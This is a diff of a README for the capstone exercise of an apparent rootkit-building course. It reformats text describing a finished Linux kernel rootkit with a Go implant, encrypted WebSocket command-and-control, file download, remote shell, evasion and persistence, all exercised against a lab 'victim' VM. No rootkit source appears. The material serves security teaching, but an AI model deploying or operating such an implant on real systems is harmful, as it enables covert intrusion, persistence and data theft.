@@ -5,8 +5,9 @@
 This is it.
 
 Thirty exercises built a Linux rootkit from an empty kernel module to a remotely
-operated implant. P00 is the final assessment: operate the finished system end
-to end, through the real interfaces, and prove every mechanism holds.
+operated implant.
+P00 is the final assessment: operate the finished system end to end, through the
+real interfaces, and prove every mechanism holds.
 
 There is no code to write.
 
@@ -18,7 +19,7 @@ The complete product, running:
 OPERATOR HOST                              TARGET VM
 
 +----------------------+                  +----------------------+
-| terminal + web UI    │    WebSocket     | rklings_agent        |
+| terminal + web UI    |    WebSocket     | rklings_agent        |
 | http://127.0.0.1:8080| <--------------> | AEAD + persist       |
 +----------------------+                  +----------+-----------+
                                                      |
@@ -33,10 +34,10 @@ OPERATOR HOST                              TARGET VM
 ## Transport
 
 The agent embeds two 32-byte X25519 keys: `keys/agent.key` (private) and
-`keys/operator.pub` (public). Both sides derive a shared AES-256-GCM key via
-ECDH. The encryption key and agent ID are derived independently via HKDF with
-separate labels (`rklings-aead` and `rklings-id`), so the ID leaks no key
-material.
+`keys/operator.pub` (public).
+Both sides derive a shared AES-256-GCM key via ECDH.
+The encryption key and agent ID are derived independently via HKDF with separate
+labels (`rklings-aead` and `rklings-id`), so the ID leaks no key material.
 
 The agent connects to the operator over WebSocket, authenticating with its agent
 ID and an encrypted hello frame:
@@ -83,33 +84,33 @@ a valid shared key reach the operator protocol.
 ```text
 exercises/P00-complete-rootkit
 ├── agent
-│   ├── crypto.go
-│   ├── dispatch.go
-│   ├── evasion.go
-│   ├── go.mod
-│   ├── go.sum
-│   ├── handlers.go
-│   ├── hidden.go
-│   ├── main.go
-│   ├── operator.go
-│   ├── persistence.go
-│   ├── singleton.go
-│   └── transport.go
+│   ├── crypto.go
+│   ├── dispatch.go
+│   ├── evasion.go
+│   ├── go.mod
+│   ├── go.sum
+│   ├── handlers.go
+│   ├── hidden.go
+│   ├── main.go
+│   ├── operator.go
+│   ├── persistence.go
+│   ├── singleton.go
+│   └── transport.go
 └── kernel
     ├── core
-    │   ├── dispatch.c
-    │   ├── escalation.c
-    │   ├── filter.c
-    │   ├── init.c
-    │   ├── module.c
-    │   └── target.c
+    │   ├── dispatch.c
+    │   ├── escalation.c
+    │   ├── filter.c
+    │   ├── init.c
+    │   ├── module.c
+    │   └── target.c
     ├── include
-    │   └── rootkit.h
+    │   └── rootkit.h
     └── Kbuild
 ```
 
-Every file is a supplied, read-only product artifact. The operator lives in
-`product/operator`.
+Every file is a supplied, read-only product artifact.
+The operator lives in `product/operator`.
 
 ## Test it
 
@@ -128,8 +129,8 @@ root@victim:~# /rklings/rklings_agent &
 $ ./rklings serve P00
 ```
 
-The agent connects over WebSocket with AEAD encryption. The terminal prompt
-appears; the dashboard is live at `http://127.0.0.1:8080`.
+The agent connects over WebSocket with AEAD encryption.
+The terminal prompt appears; the dashboard is live at `http://127.0.0.1:8080`.
 
 ## Operate it
 
@@ -149,8 +150,8 @@ victim-17def67e > download /etc/hostname
 saved 7 bytes -> .rklings/downloads/victim-17def67e/etc/hostname
 ```
 
-`shell` opens a persistent PTY; `Ctrl+]` returns to the operator. With multiple
-victims, `agents` lists them and `use <id>` selects one.
+`shell` opens a persistent PTY; `Ctrl+]` returns to the operator.
+With multiple victims, `agents` lists them and `use <id>` selects one.
 
 ## Prove persistence
 
@@ -182,7 +183,6 @@ $ ./rklings validate P00
   [+] removal clears persistence and module is absent after reboot
   PASS
 ```
-
 
 ## Next
 
